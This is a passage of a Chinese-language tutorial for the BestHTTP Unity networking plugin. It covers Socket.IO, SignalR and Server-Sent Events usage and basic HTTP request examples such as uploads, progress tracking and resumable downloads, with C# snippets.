‘MyNick’, ‘Msg to the client’); \n    //客户端接收\n    // subscribe to the &quot;message&quot; event \n    manager.Socket.On(&quot;message&quot;, OnMessage); \n    // event handler \n    void OnMessage(Socket socket, Packet packet, params object[] args) \n    { \n            // args[0] is the nick of the sender \n            // args[1] is the message \n            Debug.Log(string.Format(&quot;Message from {0}: {1}&quot;, args[0], args[1])); \n    } </code></pre><pre><code>&gt;&gt;&gt;\n        ●“connect”：命名空间打开时发送。 \n        ●“connecting”：当SocketManager开始连接到socket.io服务器时发送。 \n        ●“event”：在自定义（程序员定义的）事件上发送。 \n        ●“disconnect”：当传输断开，SocketManager关闭，Socket关闭或在握手数据中指定的给定时间内没有从服务器收到Pong消息时发送。 \n        ●“reconnect”：插件成功重新连接到socket.io服务器时发送。 \n        ●“reconnecting”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_attempt”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_failed”：重新连接尝试无法连接到服务器并且ReconnectAttempt达到选项“ReconnectionAttempts”值时发送。 \n        ●“error”：在服务器或内部插件错误上发送。事件的唯一参数是BestHTTP.SocketIO.Error对象。\n        ● Once：您可以订阅仅被调用一次的事件。manager.Socket.Once(&quot;connect&quot;, OnConnected); \n        ● Off:您可以删除所有活动订阅，或只删除一个\n        // 删除所有的回调事件\n        manager.Socket.Off(); \n        //从&quot;connect&quot;事件中删除所有回调\n        manager.Socket.Off(&quot;connect&quot;); \n        //从&quot;connect&quot;事件中删除OnConnected回调\n        manager.Socket.Off(&quot;connect&quot;, OnConnected); \n&gt;&gt;&gt;\n\n* 5:Sending events ,您可以使用“Emit”功能发送事件。您必须将事件名称作为第一个参数和可选的其他参数传递。这些将被编码为json并将被发送到服务器。您可以选择设置一个回调函数，该函数将在服务器处理事件时被调用（您必须正确设置服务器代码才能发回回调函数。有关更多信息，请参阅Socket.IO服务器端文档）。</code></pre><pre><code>    // 发送携带 2 个参数的事件给服务器\n    manager.Socket.Emit(&quot;message&quot;, &quot;userName&quot;, &quot;message&quot;); \n\n    // 发送携带 2 个参数的并有回调事件的事件给服务器\n    manager.Socket.Emit(&quot;custom event&quot;, OnAckCallback, &quot;param 1&quot;, &quot;param 2&quot;); \n    void OnAckCallback(Socket socket, Packet originalPacket, params object[] args) { Debug.Log(&quot;OnAckCallback!&quot;); } </code></pre><pre><code>您可以通过调用套接字的EmitAck函数向服务器发回确认。您必须传递原始数据包和任何可选数据,您可以保留对数据包的引用，并从其他位置调用EmitAck:</code></pre><pre><code>    manager[&quot;/customNamespace&quot;].On(&quot;customEvent&quot;, (socket, packet, args) =&gt; { socket.EmitAck(packet, &quot;Event&quot;, &quot;Received&quot;, &quot;Successfully&quot;); }); </code></pre><pre><code>* 6:发送二进制数据有 2 种方法\n1):通过传递给Emit函数，插件将扫描参数，如果找到参数，它将把它转换为二进制附件（如Socket.IO 1.0中所介绍的）。这是最有效的方法，因为它不会将字节数组转换为客户端的Base64编码字符串，并在服务器端转换为二进制。</code></pre><pre><code>    byte[] data = new byte[10]; \n    manager.Socket.Emit(&quot;eventWithBinary&quot;, &quot;textual param&quot;, data); </code></pre><pre><code>2):如果二进制数据作为字段或属性嵌入对象中，则Json编码器必须支持转换。默认的Json编码器无法将嵌入的二进制数据转换为Json，您必须使用更高级的Json解析器库（如&#39;JSON .NET For Unity&#39; - http://u3d.as/5q2）\n* 7:接收二进制数据\n在Socket.IO服务器中，当二进制数据发送到客户端时，它将用Json对象（{&#39;_ placeholder&#39;：true，&#39;num&#39;：xyz}）替换数据，并将二进制数据发送到另一个数据包中。在客户端，这些数据包将被收集并合并到一个数据包中。二进制数据将位于数据包的Attachments属性中。\n1):在这里你也可以选择使用这个数据包：\n在事件处理程序中，您可以通过数据包的Attachments属性访问所有二进制数据,autoDecodePayload默认为 true</code></pre><pre><code>    Socket.On(&quot;frame&quot;, OnFrame); \n    void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); }</code></pre><pre><code>2):第二个选项与前一个选项几乎相同，略有改进：我们不会将发送的Json字符串解码为c＃对象。我们可以这样做，因为我们知道服务器只发送了二进制数据，此事件没有其他信息。因此，我们将让插件知道不解码有效负载</code></pre><pre><code>    //订阅“frame”事件，并将autoDecodePayload标志设置为false,不让插件自动解码\n    Socket.On(&quot;frame&quot;, OnFrame, /*autoDecodePayload:*/ false); \n    void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); } </code></pre><pre><code>3):我们可以将&#39;{&#39;_placeholder&#39;：true，&#39;num&#39;：xyz}&#39;字符串替换为附件列表中附件的索引。</code></pre><pre><code>    Socket.On(&quot;frame&quot;, OnFrame, /*autoDecodePayload:*/ false); \n    void OnFrame(Socket socket, Packet packet, params object[] args) \n    { \n            //用索引替换Json对象\n            packet.ReconstructAttachmentAsIndex(); \n            // 现在，将Payload解码为 object[]\n            args = packet.Decode(socket.Manager.Encoder); \n            // args现在只包含一个索引号（可能为0） \n            byte[] data = packet.Attachments[Convert.ToInt32(args[0])]; texture.LoadImage(data); \n    } </code></pre><pre><code>4):我们可以用附件中转换为Base64编码字符串的二进制数据替换&#39;{&#39;_ placeholder&#39;：true，&#39;num&#39;：xyz}&#39;字符串。当高级Json解析器必须将其设置为对象的字段或属性时，它可以将其转换为字节数组</code></pre><pre><code>    Socket.On(&quot;frame&quot;, OnFrame, /*autoDecodePayload:*/ false); \n    void OnFrame(Socket socket, Packet packet, params object[] args) \n    { \n            // 用Base64编码的字符串替换Json对象 packet.ReconstructAttachmentAsBase64(); \n            // 现在，将Payload解码为object[]\n            args = packet.Decode(socket.Manager.Encoder); \n            // args现在包含一个Base64编码的字符串\n            byte[] data = Convert.FromBase64String(args[0] as string); texture.LoadImage(data); \n    }</code></pre><pre><code>* 8:设置默认的Json编码器, 您可以通过将SocketManager的静态DefaultEncoder设置为新的编码器来更改默认的Json编码器。在此步骤之后，所有新创建的SocketManager将使用此编码器。或者，您可以直接将SocketManager对象的Encoder属性设置为编码器。\n编写自定义Json编码器:如果由于各种原因想要更改默认的Json编码器，首先必须编写一个新的Json编码器。为此，您必须编写一个新类，该类从BestHTTP.SocketIO.JsonEncoders命名空间实现IJsonEncoder。剥离的IJsonEncoder非常小，你必须只实现两个功能：</code></pre><pre><code>    public interface IJsonEncoder \n    { \n            List&lt;object&gt; Decode(string json); \n            string Encode(List&lt;object&gt; obj); \n    } </code></pre><pre><code>Decode函数必须将给定的json字符串解码为对象列表。由于Socket.IO协议的性质，发送的json是一个数组，第一个元素是事件的名称。Encode函数用于编码客户端要发送给服务器的数据。此列表的结构与Decode相同：列表的第一个元素是事件的名称，任何其他元素是用户发送的参数。例子:</code></pre><pre><code>    using LitJson; \n    public sealed class LitJsonEncoder : IJsonEncoder \n    { \n            public List&lt;object&gt; Decode(string json) \n            { \n                    JsonReader reader = new JsonReader(json); \n                    return JsonMapper.ToObject&lt;List&lt;object&gt;&gt;(reader); \n            } \n            public string Encode(List&lt;object&gt; obj) \n            { \n                    JsonWriter writer = new JsonWriter(); \n                    JsonMapper.ToJson(obj, writer); \n                    return writer.ToString(); \n            } \n    } </code></pre><pre><code>\n* 9:AutoDecodePayload属性,\n已经在“接收二进制数据”中讨论过AutoDecodePayload，但是您不仅可以按event设置此值，还可以设置每个socket的值。socket具有AutoDecodePayload属性，该属性用作事件订阅的默认值。其默认值为true - 所有Payload都已解码并分派给事件订阅者。如果设置为false，插件将不进行解码，您必须自己完成。\n你不想每次都抛出args：当然！您可以在Socket对象上设置AutoDecodePayload，并且可以使用您喜欢的Json解析器将Packet的Payload解码为强类型对象。但请记住，Payload将包含事件的名称，它是一个json数组。示例Payload如下所示：&#39;[&#39;eventName&#39;，{&#39;field&#39;：&#39;stringValue&#39;}，{&#39;field&#39;：1.0}]&#39;。\n\n* 10:Error handling  发生服务器端或客户端错误时发出“错误”事件。事件的第一个参数是Error对象。这将包含Code属性中的错误代码和Message属性中的字符串消息。此类中的ToString（）函数已被重写，您可以使用此函数写出其内容。</code></pre><pre><code>    Socket.On(SocketIOEventTypes.Error, OnError); \n    void OnError(Socket socket, Packet packet, params object[] args) \n    { \n            Error error = args[0] as Error; \n            switch (error.Code) \n            { \n                    case SocketIOErrors.User: \n                            Debug.Log(&quot;Exception in an event handler!&quot;); \n                    break; \n                    case SocketIOErrors.Internal: \n                            Debug.Log(&quot;Internal error!&quot;); \n                    break; \n                    default: \n                            Debug.Log(&quot;Server error!&quot;); break; \n            } \n            Debug.Log(error.ToString()); \n    } </code></pre><pre><code>\n* 11:SocketOptions类中的可用选项,您可以将SocketOptions实例传递给SocketManager的构造函数。您可以更改以下选项：\n&gt;&gt;&gt;\n        1):Reconnection：断开连接后是否自动重新连接。其默认值为true\n        2):ReconnectionAttempts：放弃前的尝试次数。它的默认值是Int.MaxValu\n        3):ReconnectionDelay：在尝试重新连接之前最初等待的时间。受+/- RandomizationFactor影响。例如，默认初始延迟将在500ms到1500ms之间。其默认值为10000毫秒。\n        4):ReconnectionDelayMax：重新连接之间等待的最长时间。如上所述，每次尝试都会增加重新连接延迟以及随机化。其默认值为5000毫秒。\n        5):RandomizationFactor：它可用于控制ReconnectionDelay范围。其默认值为0.5，可以在0..1值之间设置\n        6)Timeout:发出“connect_error”和“connect_timeout”事件之前的连接超时。它不是底层tcp套接字的连接超时，而是socket.io协议。其默认值为20000ms\n        7):AutoConnect：通过将此设置为false，您必须在决定适当时调用SocketManager的Open（）。\n        8):ConnectWith：So​​cketManager将尝试连接到此属性的传输集。它可以是TransportTypes.Polling或TransportTypes.WebSocket\n&gt;&gt;&gt;\n\n# SignalR\n* 1:像Socket.IO这样的SignalR实现使用了插件的基本功能。 HTTPRequests和WebSockets用于连接和通信连接池。 Cookie随请求一起发送，记录器用于记录有关协议和错误的信息,SignalR实现的功能简要列表：\n&gt;&gt;&gt;\n        1):兼容最新的SignalR服务器实现\n        2):好用的 API\n        3):传输回调\n        4):重新连接逻辑\n        5):支持所有Hub功能\n&gt;&gt;&gt;</code></pre><pre><code>    using BestHTTP.SignalR;\n    Uri uri = new Uri(&quot;http://besthttpsignalr.azurewebsites.net/raw-connection/&quot;);\n    //通过仅将服务器的uri传递给构造函数来创建没有集线器的连接。\n    Connection signalRConnection = new Connection(uri); \n    //通过将集线器名称传递给构造函数来创建与集线器的连接。\n    Connection signalRConnection = new Connection(uri, &quot;hub1&quot;, &quot;hub2&quot;, &quot;hubN&quot;); \n    //通过将Hub对象传递给构造函数来创建与Hub的连接。\n    Hub hub1 = new Hub(&quot;hub1&quot;); \n    Hub hub2 = new Hub(&quot;hub2&quot;); \n    Hub hubN = new Hub(&quot;hubN&quot;); \n    Connection signalRConnection = new Connection(uri, hub1, hub2, hubN); \n    //创建Connection之后，我们可以通过调用Open（）函数开始连接到服务器\n    signalRConnection.Open(); </code></pre><pre><code>* 2:Handling general events Connection类允许您订阅多个事件。这些事件如下：</code></pre><pre><code>    //OnConnected：当连接类成功连接并且SignalR协议用于通信时，将触发此事件。\n    signalRConnection.OnConnected += (con) =&gt; Debug.Log(&quot;Connected to the SignalR server!&quot;); \n\n    //OnClosed：当SignalR协议关闭时，将触发此事件，并且不再发送或接收更多消息。\n    signalRConnection.OnClosed += (con) =&gt; Debug.Log(&quot;Connection Closed&quot;); \n    //OnError：发生错误时调用。如果连接已打开，插件将尝试重新连接，否则连接将关闭。\n    signalRConnection.OnError += (conn, err) =&gt; Debug.Log(&quot;Error: &quot; + err); \n\n    //OnReconnecting：启动重新连接尝试时会触发此事件。在此事件之后，将调用OnError或OnReconnected事件。可以在OnReconnected / OnClosed事件之前触发多个OnReconnecting-OnError事件对，因为插件将尝试在给定时间内多次重新连接。\n    signalRConnection.OnReconnecting += (con) =&gt; Debug.Log(&quot;Reconnecting&quot;); \n\n    //OnReconnected：重新连接尝试成功时触发。\n    signalRConnection.OnReconnecting += (con) =&gt; Debug.Log(&quot;Reconnected&quot;); \n    //OnStateChnaged：连接状态发生变化时触发。事件处理程序将同时接收旧状态和新状态。\n    signalRConnection.OnStateChanged += (conn, oldState, newState) =&gt; Debug.Log(string.Format(&quot;State Changed {0} -&gt; {1}&quot;, oldState, newState)); \n\n    //OnNonHubMessage：当服务器向客户端发送非集线器消息时触发。客户端应该知道服务器期望的消息类型，并且应该相应地转换接收的对象。\n    signalRConnection.OnNonHubMessage + =（con，data）= Debug.Log（&#39;来自服务器的消息：&#39;+ data.ToString（））;\n\n    //RequestPreparator：为每个发出并将发送到服务器的HTTPRequest调用此委托。它可用于进一步自定义请求。\n    signalRConnection.RequestPreparator = (con, req, type) =&gt; req.Timeout = TimeSpan.FromSeconds(30); </code></pre><pre><code>\n* 3:Sending non-Hub  messages </code></pre><pre><code>    //将非集线器消息发送到服务器很容易，因为调用连接对象上的函数：\n    signalRConnection.Send(new { Type = &quot;Broadcast&quot;, Value = &quot;Hello SignalR World!&quot; }); \n\n    //此函数将使用Connection的JsonEncoder将给定对象编码为Json字符串，并将其发送到服务器。已编码的Json字符串可以使用SendJson函数发送\n    signalRConnection.SendJson(&quot;{ Type: ‘Broadcast’, Value: ‘Hello SignalR World!’ }&quot;); </code></pre><pre><code>\n* 4:Hubs,为了在客户端上定义Hub可以从服务器调用的方法，并调用a上的方法\n服务器上的集线器必须将集线器添加到Connection对象。这可以通过将集线器名称或集线器实例添加到Connection构造函数来完成，在“连接类”部分中进行了演示</code></pre><pre><code>    //可以通过索引或名称通过Connection对象访问Hub实例。\n    Hub hub = signalRConnection[0]; \n    Hub hub = signalRConnection[&quot;hubName&quot;]; \n\n    // 注册服务器可调用方法,要处理服务器可调用方法调用，我们必须调用集线器的On函数：\n    signalRConnection[&quot;hubName&quot;].On(&quot;joined&quot;, Joined); \n    void Joined(Hub hub, MethodCallMessage msg) { Debug.log(string.Format(&quot;{0} joined at {1}&quot;, msg.Arguments[0], msg.Arguments[1])); }</code></pre><pre><code>MethodCallMessage是服务器发送的对象，包含以下属性：\n&gt;&gt;&gt;\n        Hub：包含方法必须调用的集线器名称的字符串。\n        Method：包含方法名称的字符串\n        Arguments：包含方法调用参数的对象数组。它可以是一个空数组。\n        State：包含其他自定义数据的字典\n&gt;&gt;&gt;\n该插件将使用Hub和Method属性将消息路由到正确的集线器和事件处理程序。处理方法调用的函数只能使用Arguments和State属性。\n\n* 5:Call server-side methods \n调用服务器端方法可以通过调用Hub的Call函数来完成。调用函数重载以满足每个需求。 Call函数是非阻塞函数，它们不会阻塞，直到服务器发回有关该调用的任何消息。\n* 6:重载函数:\nCall（string method，params object [] args）：这可以用来以一种即发即弃的方式调用服务器端函数。我们不会收到有关方法调用成功或失败的任何消息。可以在没有任何&#39;args&#39;参数的情况下调用此函数来调用无参数方法</code></pre><pre><code>    //在没有任何参数的情况下调用服务器端函数\n    signalRConnection[&quot;hubName&quot;].Call(&quot;Ping&quot;); \n    //使用两个字符串参数调用服务器端函数：&#39;param1&#39;和&#39;param2&#39;\n    signalRConnection[&quot;hubName&quot;].Call(&quot;Message&quot;, &quot;param1&quot;, &quot;param2&quot;); </code></pre><pre><code>Call（string method ，OnMethodResultDelegate onResult，params object [] args）：此函数可以用作前一个函数，但是函数可以作为第二个参数传递，该参数将在成功调用服务器端函数时调用。</code></pre><pre><code>    signalRConnection[&quot;hubName&quot;].Call(&quot;GetValue&quot;, OnGetValueDone); \n    void OnGetValueDone(Hub hub, ClientMessage originalMessage, ResultMessage result) { Debug.Log(&quot;GetValue executed on the server. Return value of the function:&quot; + result.ReturnValue.ToString()); } </code></pre><pre><code>此回调函数接收调用此函数的Hub，发送到服务器的原始ClientMessage消息以及由于方法调用而由服务器发送的ResultMessage实例。 ResultMessage对象包含ReturnValue和State属性。               \n如果方法的返回类型为void，则ReturnValue为null.\nCall（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，params object [] args）：此函数可用于指定当方法无法在服务器上运行时将调用的回调。由于方法调用中存在未找到的方法，错误的参数或未处理的异常，因此可能会发生故障</code></pre><pre><code>    signalRConnection[&quot;hubName&quot;].Call(&quot;GetValue&quot;, OnGetValueDone, OnGetValueFailed); \n    void OnGetValueFailed(Hub hub, ClientMessage originalMessage, FailureMessage error) \n    { \n            Debug.Log(&quot;GetValue failed. Error message from the server: &quot; + error.ErrorMessage); \n    } </code></pre><pre><code> FailureMessage包含以下属性：\n &gt;&gt;&gt;\n        ○ IsHubError：如果是Hub错误，则为True。 \n        ○ ErrorMessage：有关错误本身的简短消息。 \n        ○ StackTrace：如果在服务器上打开了详细的错误报告，则它包含错误的堆栈跟踪。\n        ○ AdditionalData：如果它不为null，则它包含有关错误的其他信息。\n &gt;&gt;&gt;\n Call（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，OnMethodProgressDelegate onProgress，params object [] args）：此函数可用于向服务器端方法调用添加其他进度消息处理程序。对于长时间运行的作业，服务器可以将进度消息发送到客户端。</code></pre><pre><code>    signalRConnection[&quot;hubName&quot;].Call(&quot;GetValue&quot;, OnGetValueDone, OnGetValueFailed, OnGetValueProgress); \n    void OnGetValueProgress(Hub hub, ClientMessage originalMessage, ProgressMessage progress) \n    { \n            Debug.Log(string.Format(&quot;GetValue progressed: {0}%&quot;, progress.Progress)); \n    }</code></pre><pre><code> 当插件收到ResultMessage或FailureMessage时，它不会为这些消息之后的ProgressMessages提供服务。\n\n * 7:使用Hub类作为继承的基类,Hub类可以用作封装集线器功能的基类。</code></pre><pre><code>    class SampleHub : Hub \n    { \n            // 默认构造函数。每个集线器都必须有一个有效的名称. \n            public SampleHub() :base(&quot;SampleHub&quot;) \n            { \n                    // 注册服务器可调用函数 \n                    base.On(&quot;ClientFunction&quot;, ClientFunctionImplementation); \n            }\n            // 私有函数实现服务器可调用函数\n            private void ClientFunctionImplementation(Hub hub, MethodCallMessage msg) \n            { \n            // TODO: implement \n            } \n            // 包装函数调用服务器端函数.\n            public void ServerFunction(string argument) \n            { \n                    base.Call(&quot;ServerFunction&quot;, argument); \n            } \n    }\n    //可以实例化此SampleHub并将其传递给Connection的构造函数：\n    SampleHub sampleHub = new SampleHub(); Connection signalRConnection = new Connection(Uri, sampleHub); </code></pre><pre><code>\n * 8:Authentication\n Connection类具有AuthenticationProvider属性，可以将其设置为实现IAuthenticationProvider接口的对象,实现者必须实现以下属性和功能\n &gt;&gt;&gt;\n        ● bool IsPreAuthRequired：如果在Connection类向服务器发出任何请求之前必须运行身份验证，则返回true的属性。示例：cookie身份验证器必须返回false，因为它必须发送用户凭据并接收必须随请求一起发送的cookie。 \n        ● StartAuthentication：仅在IsPreAuthRequired为true时才需要的函数。否则它不会被调用。 \n        ● PrepareRequest：使用请求和请求类型枚举调用的函数。此函数可用于在将请求发送到服务器之前准备。 \n        ● OnAuthenticationSucceded：IsPreAuthRequired为true且身份验证过程成功时必须调用的事件。 \n        ● OnAuthenticationFailed：IsPreAuthRequired为true且身份验证过程失败时必须调用的事件。\n &gt;&gt;&gt;\n 一个非常简单的基于Header的身份验证器看起来像这样：</code></pre><pre><code>    class HeaderAuthenticator : IAuthenticationProvider \n    { \n            public string User { get; private set; } \n            public string Roles { get; private set; } \n            // 此类身份验证不需要预先验证步骤\n            public bool IsPreAuthRequired { get { return false; } } \n            //未使用的事件，因为IsPreAuthRequired为false \n            public event OnAuthenticationSuccededDelegate OnAuthenticationSucceded; \n            //未使用的事件，因为IsPreAuthRequired为false\n            public event OnAuthenticationFailedDelegate OnAuthenticationFailed; \n            // 使用用户名和角色初始化身份验证器的构造函数.\n            public HeaderAuthenticator(string  user, string roles) \n            { \n                    this.User = user; this.Roles = roles; \n            } \n            //未使用的事件，因为IsPreAuthRequired为false             \n            public void StartAuthentication() { } \n            // 通过向其添加两个标头来准备请求\n            public void PrepareRequest(BestHTTP.HTTPRequest request, RequestTypes type) \n            { \n                    request.SetHeader(&quot;username&quot;, this.User); request.SetHeader(&quot;roles&quot;, this.Roles); \n            }\n    }</code></pre><pre><code> 与Socket.IO的Manager类一样，SignalR的Connection类具有JsonEncoder属性，也可以设置静态Connection.DefaultEncoder。 JsonEncoder必须从BestHTTP.SignalR.JsonEncoders命名空间实现IJsonEncoder接口。该软件包包含一个LitJsonEncoder示例，也可用于某些示例\n\n ## Server-Sent Events\n\n* 1:Server-Sent Events是一种基于字符串的单向协议。数据来自服务器，没有选项可以向服务器发送任何内容。它是使用最新的草案实现的。虽然协议的名称是Server-Sent Events，但类本身名为EventSource,发生错误时，一旦发送LastEventId，插件将尝试重新连接，让服务器发送任何我们应该收到的缓冲消息</code></pre><pre><code>    //The EventSource class \n    //EventSource类位于BestHTTP.ServerSentEvents命名空间中：\n    using BestHTTP.ServerSentEvents; \n    var sse = new EventSource(new Uri(&quot;http://server.com&quot;)); </code></pre><pre><code>* 2:Properties,这些是EventSource类的公开公开属性：\n&gt;&gt;&gt;\n        ● Uri：这是协议尝试连接的端点。它是通过构造函数设置的。 \n        ● State：EventSource对象的当前状态。 \n        ● ReconnectionTime：等待尝试重新连接尝试的时间。它的默认值是2秒。 \n        ● LastEventId：最后收到的事件的id。如果没有收到任何事件ID，它将为null。 \n        ● InternalRequest：将在Open函数中发送的内部HTTPRequest对象。\n&gt;&gt;&gt;\n\n* 3:事件</code></pre><pre><code>    //OnOpen：成功升级协议时调用它\n    eventSource.OnOpen += OnEventSourceOpened; \n    void OnEventSourceOpened(EventSource source) { Debug.log(&quot;EventSource Opened!&quot;); } \n\n    //OnMessage：当客户端从服务器收到新消息时调用它。此函数将接收一个Message对象，该对象包含Data属性中消息的有效内容。每次客户端收到消息时都会调用此事件，即使消息具有有效的事件名称，我们也为此事件分配了一个事件处理程序！\n    eventSource.OnMessage += OnEventSourceMessage;\n    void OnEventSourceMessage(EventSource source, Message msg) { Debug.log(&quot;Message: &quot; + msg.Data); }\n\n    // OnError：在连接到服务器或处理数据流时遇到错误时调用\n    eventSource.OnError += OnEventSourceError; \n    void OnEventSourceError(EventSource source, string error) { Debug.log(&quot;Error: &quot; + error); }\n\n    //OnRetry：在插件尝试重新连接到服务器之前调用此函数。如果函数返回false，则不会进行任何尝试，并且将关闭EventSource。\n    eventSource.OnRetry += OnEventSourceRetry; \n    bool OnEventSourceRetry(EventSource source) { // disable retry return false; }\n\n    //OnClosed：当EventSource关闭时，将调用此事件。\n    eventSource.OnClosed += OnEventSourceClosed; \n    void OnEventSourceClosed(EventSource source) { Debug.log(&quot;EventSource Closed!&quot;); } \n\n    //OnStateChanged：每次State属性更改时调用。\n    eventSource.OnStateChanged += OnEventSourceStateChanged; \n    void OnEventSourceStateChanged(EventSource source, States oldState, States newState) { Debug.log(string.Format(&quot;State Changed {0} =&gt; {1}&quot;, oldSate, newState))); }</code></pre><pre><code>\n* 4:Functions,这些是EventSource对象的公共函数。</code></pre><pre><code>    //Open: 调用此函数，插件将开始连接到服务器并升级到Server-Sent Events协议。\n    EventSource eventSource = new EventSource(new Uri(&quot;http://server.com&quot;)); \n    eventSource.Open(); \n\n    // On:使用此功能，客户端可以订阅事件\n    eventSource.On(&quot;userLogon&quot;, OnUserLoggedIn); \n    void OnUserLoggedIn(EventSource source, Message msg) { Debug.log(msg.Data); }\n\n    //Off:它可用于取消订阅活动。\n    eventSource.Off(&quot;userLogon&quot;); \n\n    //Close: 此函数将开始关闭EventSource对象。\n    eventSource.Close(); </code></pre><pre><code>* 5:Message,Message类是一个逻辑单元，包含服务器可以发送的所有信息,Properties:\n&gt;&gt;&gt;\n     ● Id：已发送事件的ID。如果没有发送id，则可以为null。它被插件使用。 \n     ● 事件：事件的名称。如果没有发送事件名称，则可以为null。 \n     ● 数据：消息的实际有效负载。 \n     ● 重试：服务器发送插件在重新连接尝试之前应等待的时间。它被插件使用。\n&gt;&gt;&gt;\n\n## 简单例子\n● Upload a picture using forms </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://server.com&quot;), HTTPMethods.Post, onFinished); \n    request.AddBinaryData(&quot;image&quot;, texture.EncodeToPNG(), &quot;image.png&quot;); \n    request.Send(); </code></pre><pre><code>● Upload a picture without forms, sending only the raw data </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://server.com&quot;), HTTPMethods.Post, onFinished); \n    request.SetHeader(&quot;Content-Type&quot;, &quot;image/png&quot;); \n    request.Raw = texture.EncodeToPNG(); \n    request.Send(); </code></pre><pre><code>● Add custom header </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://server.com&quot;), HTTPMethods.Post, onFinished); \n    request.SetHeader(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;); \n    request.RawData = UTF8Encoding.GetBytes(ToJson(data)); \n    request.Send(); </code></pre><pre><code>● Display  download progress </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://serveroflargefile.net/path&quot;), (req, resp) =&gt; { Debug.Log(&quot;Finished!&quot;); }); \n    request.OnProgress += (req, down, length) =&gt; Debug.Log(string.Format(&quot;Progress: {0:P2}&quot;, down / (float)length)); \n    request.Send(); </code></pre><pre><code>● Abort a request </code></pre><pre><code>    var request = new HTTPRequest(new Uri(address), (req, resp) =&gt; { // State should be HTTPRequestStates.Aborted if we call Abort() before // it’s finishes Debug.Log(req.State); }); \n    request.Send(); \n    request.Abort();</code></pre><pre><code>● 可恢复下载的范围请求,第一个请求是获取服务器功能的Head请求。当支持范围请求时，将调用DownloadCallback函数。在这个函数中，我们将创建一个新的实际请求来获取内容的块，并将回调函数设置为此函数。当前下载位置保存到PlayerPrefs，因此即使在应用程序重新启动后也可以恢复下载。</code></pre><pre><code>    private const int ChunkSize = 1024 * 1024; // 1 MiB - should be bigger! \n    private string saveTo = &quot;downloaded.bin&quot;; \n    void StartDownload(string url) \n    {\n    var headRequest = new HTTPRequest(new Uri(url), HTTPMethods.Head, (request, response) =&gt; \n    {\n            if (response == null) Debug.LogError(&quot;Response null. Server unreachable? Try again later.&quot;); \n            else {\n                    if (response.StatusCode == 416) Debug.LogError(&quot;Requested range not satisfiable&quot;); else if (response.StatusCode == 200) \n                    Debug.LogError(&quot;Partial content doesn&#39;t supported by the server, content can be downloaded as a whole.&quot;); \n                    else if (response.HasHeaderWithValue(&quot;accept-ranges&quot;,&quot;none&quot;)) Debug.LogError(&quot;Server doesn&#39;t supports the &#39;Range&#39; header! The file can&#39;t be downloaded in parts.&quot;); \n                    else DownloadCallback(request, response);         \n            }\n    }  \n    // Range header for our head request \n    int startPos = PlayerPrefs.GetInt(&quot;LastDownloadPosition&quot;,0); \n    headRequest.SetRangeHeader(startPos, startPos + ChunkSize); \n    headRequest.DisableCache = true; headRequest.Send(); \n    } \n\n    void DownloadCallback(HTTPRequest request, HTTPResponse response) \n    {\n            if (response == null) { Debug.LogError(&quot;Response null. Server unreachable, or connection lost? Try again later.&quot;); return; } var range = response.GetRange(); \n            if (range == null) { Debug.LogError(&quot;No &#39;Content-Range&#39; header returned from the server!&quot;); return; } \n            else if (!range.IsValid) { Debug.LogError(&quot;No valid &#39;Content-Range&#39; header returned from the server!&quot;); return; } \n            if (request.MethodType != HTTPMethods.Head) \n            { \n                    string path = Path.Combine(Application.temporaryCachePath,saveTo); \n                    using (FileStream fs = new FileStream(path, FileMode.Append)) fs.Write(response.Data, 0, response.Data.Length); \n                    PlayerPrefs.SetInt(&quot;LastDownloadPosition&quot;, range.LastBytePos); \n                    Debug.LogWarning(string.Format(&quot;Download Status: {0}-{1}/{2}&quot;, range.FirstBytePos, range.LastBytePos, range.ContentLength)); \n                    if (range.LastBytePos == range.ContentLength - 1) { Debug.LogWarning(&quot;Download finished!&quot;); return; } \n            }\n            var downloadRequest = new HTTPRequest(request.Uri, HTTPMethods.Get, /*isKeepAlive:*/ true, DownloadCallback); \n            int nextPos = 0; \n            if (request.MethodType != HTTPMethods.Head) nextPos = range.LastBytePos + 1; else nextPos = PlayerPrefs.GetInt(&quot;LastDownloadPosition&quot;, 0);\n            downloadRequest.SetRangeHeader(nextPos, nextPos + ChunkSize); \n            downloadRequest.DisableCache = true;    \n            downloadRequest.Send(); \n    } </code></pre><pre><code>\n## 其他\n\n* 1:禁用功能\n&gt;&gt;&gt;\n        ●BESTHTTP_DISABLE_COOKIES：使用此定义可以禁用所有与cookie相关的代码。不会进行cookie解析，保存和发送。 \n        ●BESTHTTP_DISABLE_CACHING：使用此定义可以禁用所有与缓存相关的代码。不会进行缓存或缓存验证。 \n        ●BESTHTTP_DISABLE_SERVERSENT_EVENTS：可以使用此功能禁用服务器发送的事件。 SignalR不会回退到此。 \n        ●BESTHTTP_DISABLE_WEBSOCKET：可以使用此禁用Websocket。 SignalR和Socket.IO不会使用此协议。 \n        ●BESTHTTP_DISABLE_SIGNALR：将禁用整个SignalR实施。 \n        ●BESTHTTP_DISABLE_SIGNALR_CORE：将禁用SignalR Core实施。 \n        ●BESTHTTP_DISABLE_SOCKETIO：将禁用整个Socket.IO实现。 \n        ●BESTHTTP_DISABLE_ALTERNATE_SSL：如果您没有为WebSocket使用HTTPS或WSS，或者您对默认实现感到满意，则可以禁用备用ssl处理程序。 \n        ●BESTHTTP_DISABLE_UNITY_FORM：您可以删除对Unity的WWWForm的依赖。\n&gt;&gt;&gt;\n* 2:支持的平台\n&gt;&gt;&gt;\n        ● WebGL\n        ● iOS\n        ● Android\n        ● Windows Phone 10\n        ● WinRT / Metro / Windows应用商店应用8.1,10•Windows，Linux和Mac独立版\n&gt;&gt;&gt;\n* 3:在Android，iOS和桌面平台上.net的Net SslStream用于HTTPS。这可以处理各种证书，但有些证书可能会失败。要提供备用解决方案BouncyCastle捆绑在插件中，您可以通过在HTTPRequest对象上将UseAlternateSSL设置为true来使用它。但它也可能在一些认证上失败。在Windows Phone 8.1（及更高版本）和WinRT（Windows应用商店应用程序）上，安全的Tls 